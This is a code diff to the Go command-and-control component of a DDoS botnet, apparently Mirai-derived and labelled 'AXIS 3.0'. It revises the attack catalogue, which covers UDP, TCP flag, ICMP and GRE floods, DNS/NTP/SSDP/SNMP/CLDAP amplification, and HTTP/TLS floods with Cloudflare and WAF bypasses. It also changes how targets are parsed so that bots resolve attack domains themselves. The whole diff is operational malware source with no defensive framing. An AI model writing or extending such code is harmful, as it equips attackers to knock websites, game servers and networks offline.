@@ -33,12 +33,12 @@ var flagInfoLookup = map[string]FlagInfo{
 	"rand":      {1, "Randomize packet data content, default is 1 (yes)"},
 	"sport":     {6, "Source port, default is random"},
 	"dport":     {7, "Destination port, default is random"},
-	"domain":    {8, "Domain name to attack"},
+	"domain":    {8, "Domain name (bot resolves via DNS)"},
 	"method":    {9, "HTTP method name, default is GET"},
 	"path":      {11, "HTTP path, default is /"},
 	"conns":     {12, "Number of connections"},
 	"source":    {13, "Source IP address, 255.255.255.255 for random"},
-	"url":       {14, "Full HTTP/HTTPS URL"},
+	"url":       {14, "Full HTTP/HTTPS URL (bot resolves via DNS)"},
 	"https":     {15, "Use HTTPS/SSL (0 or 1)"},
 	"useragent": {16, "User-Agent string for HTTP requests"},
 	"cookies":   {17, "Cookies for HTTP requests"},
@@ -47,43 +47,38 @@ var flagInfoLookup = map[string]FlagInfo{
 	"port":      {7, "Destination port (alias for dport)"},
 }
 
-/*
- * Attack method IDs - Must match bot/attack.h
- */
 var attackInfoLookup = map[string]AttackInfo{
-	/* AXIS 3.0 L4 Methods */
-	"udp":      {0, []uint8{0, 1, 6, 7, 13}, "UDP flood optimized for Gbps"},
+	/* L4 Methods */
+	"udp":      {0, []uint8{0, 1, 6, 7, 13}, "UDP flood"},
 	"vse":      {1, []uint8{0, 1, 6, 7, 13}, "Valve Source Engine A2S_INFO amplification"},
-	"fivem":    {2, []uint8{0, 1, 6, 7, 13}, "FiveM protocol flood (getinfo/sec/token)"},
+	"fivem":    {2, []uint8{0, 1, 6, 7, 13}, "FiveM protocol flood"},
 	"discord":  {30, []uint8{0, 1, 6, 7, 13}, "Discord voice chat flood"},
 	"pps":      {3, []uint8{6, 7, 13}, "High PPS UDP flood"},
 
-	/* AXIS 3.0 L7 Methods */
+	/* L7 Methods */
 	"tls":      {4, []uint8{7, 8, 9, 11, 12, 14}, "Standard TLS/HTTPS flood"},
-	"http":     {5, []uint8{7, 8, 9, 11, 12, 14, 16}, "Plain HTTP flood with rotating user agents"},
+	"http":     {5, []uint8{7, 8, 9, 11, 12, 14, 16}, "Plain HTTP flood"},
 	"cf":       {6, []uint8{7, 8, 16, 17, 18, 12, 14, 15}, "Cloudflare bypass flood"},
-
-	/* AXIS-L7 (with proxy support merged from tlsplusbypass) */
 	"axis-l7":  {7, []uint8{7, 8, 16, 17, 18, 12, 14, 15}, "Advanced L7 with WAF bypasses"},
 
-	/* Amplification Methods */
-	"dns-amp":  {8, []uint8{6, 13}, "DNS Amplification (50x-100x)"},
-	"ntp-amp":  {9, []uint8{6, 13}, "NTP Amplification (100x-500x)"},
-	"ssdp-amp": {10, []uint8{6, 13}, "SSDP Amplification (30x-50x)"},
-	"snmp-amp": {11, []uint8{6, 13}, "SNMP Amplification (50x-100x)"},
-	"cldap-amp": {12, []uint8{6, 13}, "CLDAP Amplification (50x-70x)"},
+	/* Amplification */
+	"dns-amp":  {8, []uint8{6, 13}, "DNS Amplification"},
+	"ntp-amp":  {9, []uint8{6, 13}, "NTP Amplification"},
+	"ssdp-amp": {10, []uint8{6, 13}, "SSDP Amplification"},
+	"snmp-amp": {11, []uint8{6, 13}, "SNMP Amplification"},
+	"cldap-amp": {12, []uint8{6, 13}, "CLDAP Amplification"},
 
-	/* Layer 4 TCP Methods */
+	/* L4 TCP */
 	"syn":      {13, []uint8{0, 1, 6, 7, 13}, "TCP SYN Flood"},
 	"ack":      {14, []uint8{0, 1, 6, 7, 13}, "TCP ACK Flood"},
 	"fin":      {15, []uint8{0, 1, 6, 7, 13}, "TCP FIN Flood"},
 	"rst":      {16, []uint8{0, 1, 6, 7, 13}, "TCP RST Flood"},
-	"tcpconn":  {17, []uint8{0, 1, 6, 7, 13}, "TCP Connection Flood (Full Handshake)"},
-	"xmas":     {18, []uint8{0, 1, 6, 7, 13}, "TCP XMAS Flood (All Flags)"},
-	"null":     {19, []uint8{0, 1, 6, 7, 13}, "TCP NULL Flood (No Flags)"},
+	"tcpconn":  {17, []uint8{0, 1, 6, 7, 13}, "TCP Connection Flood"},
+	"xmas":     {18, []uint8{0, 1, 6, 7, 13}, "TCP XMAS Flood"},
+	"null":     {19, []uint8{0, 1, 6, 7, 13}, "TCP NULL Flood"},
 	"window":   {20, []uint8{0, 1, 6, 7, 13}, "TCP Window Flood"},
 
-	/* Special Methods */
+	/* Special */
 	"icmp":     {21, []uint8{0, 1, 6, 7, 13}, "ICMP Flood"},
 	"greip":    {22, []uint8{0, 1, 6, 7, 13}, "GRE IP Flood"},
 	"greeth":   {23, []uint8{0, 1, 6, 7, 13}, "GRE Ethernet Flood"},
@@ -115,31 +110,30 @@ func NewAttack(str string, admin int) (*Attack, error) {
 	}
 	atk.Type = atkInfo.attackID
 
-	isHTTPAttack := atk.Type >= 4 && atk.Type <= 7
+	isL7 := atk.Type >= 4 && atk.Type <= 7
 
-	if isHTTPAttack {
+	if isL7 {
+		/* L7 attacks: send URL directly, bot resolves DNS */
 		targetURL := args[1]
-
-		/* Store full URL for bot DNS resolution */
 		atk.Flags[14] = targetURL
 
+		/* Parse URL components for convenience */
 		if strings.HasPrefix(targetURL, "http://") || strings.HasPrefix(targetURL, "https://") {
 			domain := extractDomainFromURL(targetURL)
 			if domain != "" {
 				atk.Flags[8] = domain
 			}
-
 			path := extractPathFromURL(targetURL)
 			if path != "" {
 				atk.Flags[11] = path
 			}
-
 			if strings.HasPrefix(targetURL, "https://") {
 				atk.Flags[15] = "1"
 			} else {
 				atk.Flags[15] = "0"
 			}
 		} else {
+			/* No protocol prefix, treat as domain */
 			atk.Flags[8] = args[1]
 			atk.Flags[11] = "/"
 			atk.Flags[15] = "0"
@@ -151,7 +145,6 @@ func NewAttack(str string, admin int) (*Attack, error) {
 			if len(parts) != 2 {
 				continue
 			}
-
 			if flagInfo, ok := flagInfoLookup[parts[0]]; ok {
 				if !uint8InSlice(flagInfo.flagID, atkInfo.attackFlags) {
 					continue
@@ -167,18 +160,17 @@ func NewAttack(str string, admin int) (*Attack, error) {
 		}
 
 	} else {
-		if ip := net.ParseIP(args[1]); ip != nil {
+		/* L4/L7-amplification: target can be IP or domain */
+		target := args[1]
+
+		/* Try as IP first */
+		if ip := net.ParseIP(target); ip != nil && ip.To4() != nil {
 			atk.Targets[binary.BigEndian.Uint32(ip.To4())] = 32
 		} else {
-			if ips, err := net.LookupIP(args[1]); err == nil {
-				for _, ip := range ips {
-					if ip.To4() != nil {
-						atk.Targets[binary.BigEndian.Uint32(ip.To4())] = 32
-					}
-				}
-			} else {
-				return nil, errors.New("Failed to resolve domain: " + args[1])
-			}
+			/* Treat as domain - bot will resolve via DNS */
+			atk.Flags[8] = target
+			/* Still store a dummy target so bot knows to resolve */
+			atk.Targets[0x01010101] = 32 /* 1.1.1.1 as placeholder */
 		}
 
 		if dur, err := strconv.Atoi(args[2]); err == nil {
@@ -192,7 +184,6 @@ func NewAttack(str string, admin int) (*Attack, error) {
 			if len(parts) != 2 {
 				continue
 			}
-
 			if flagInfo, ok := flagInfoLookup[parts[0]]; ok {
 				if !uint8InSlice(flagInfo.flagID, atkInfo.attackFlags) {
 					continue
@@ -211,15 +202,12 @@ func extractDomainFromURL(url string) string {
 	} else if strings.HasPrefix(url, "https://") {
 		url = url[8:]
 	}
-
 	if idx := strings.Index(url, "/"); idx != -1 {
 		url = url[:idx]
 	}
-
 	if idx := strings.Index(url, ":"); idx != -1 {
 		url = url[:idx]
 	}
-
 	return url
 }
 
@@ -229,11 +217,9 @@ func extractPathFromURL(url string) string {
 	} else if strings.HasPrefix(url, "https://") {
 		url = url[8:]
 	}
-
 	if idx := strings.Index(url, "/"); idx != -1 {
 		return url[idx:]
 	}
-
 	return "/"
 }
 
